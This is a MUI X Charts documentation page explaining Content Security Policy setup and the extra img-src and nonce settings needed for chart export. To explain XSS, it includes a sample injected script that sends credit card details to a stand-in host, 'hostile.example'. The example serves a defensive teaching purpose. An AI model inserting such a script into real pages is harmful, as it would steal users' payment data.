---
title: Content Security Policy (CSP)
productId: x-charts
---

# Charts - Content Security Policy (CSP)

<p class="description">This section covers the details of setting up a Content Security Policy.</p>

## What is a Content Security Policy (CSP)?

A Content Security Policy (CSP) mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from.
This list is returned as a header from the server.
For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` lets you load all assets that are located at `https://example.com/*` and denies all others.
If there is a section of your website that's vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

This vulnerability lets the attacker execute anything.
But with a secure CSP header, the browser will not load this script.

You can read more about CSP in the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

## Setting up a CSP

The MUI X Charts package depends on Material UI.
To set up a CSP, you need to follow Material UI's [CSP implementation guide](/material-ui/guides/content-security-policy/#how-does-one-implement-csp).

### CSP for exporting

You can [export charts](/x/react-charts/export/) as images or PDFs with MUI X Charts.
When a CSP is set, you need to configure additional settings for exporting to work.

To enable exporting with CSP, you need to enable the use of `data:` and `blob:` URIs for images.
Add the following directives to your CSP header:

```text
Content-Security-Policy: img-src 'self' data: blob:;
```

If your CSP defines a nonce for scripts or styles (for example, `script-src 'nonce-<value>'`), you also need to provide the same nonce when exporting.

Pass the nonce to the `printOptions` and `imageExportOptions` props of the `toolbar` slot.

```tsx
<LineChartPro
  {...settings}
  showToolbar
  slotProps={{
    toolbar: {
      printOptions: { nonce },
      imageExportOptions: [
        { type: 'image/png', nonce },
        { type: 'image/jpeg', nonce },
        { type: 'image/webp', nonce },
      ],
    },
  }}
/>
```
